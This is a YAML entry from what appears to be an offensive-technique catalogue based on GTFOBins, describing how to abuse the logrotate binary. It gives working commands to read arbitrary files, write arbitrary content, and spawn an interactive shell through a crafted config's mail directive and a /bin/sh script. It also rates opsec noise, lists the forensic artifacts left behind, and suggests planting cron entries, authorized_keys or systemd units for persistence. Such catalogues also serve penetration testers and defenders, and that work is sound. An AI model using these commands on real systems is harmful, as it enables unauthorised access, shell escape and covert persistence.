---
name: logrotate
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: logrotate /path/to/input-file
  notes: The first word is returned in a error message.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: logrotate -l /path/to/output-file DATA
  notes: The content is written in a log file.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config
    echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh
    logrotate -m /path/to/temp-file.sh -f /path/to/temp-file
  notes: This command is picky about file permissions. An existing config file can be used as weel, provided that it contains a mail directive.
references:
- https://gtfobins.github.io/gtfobins/logrotate/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
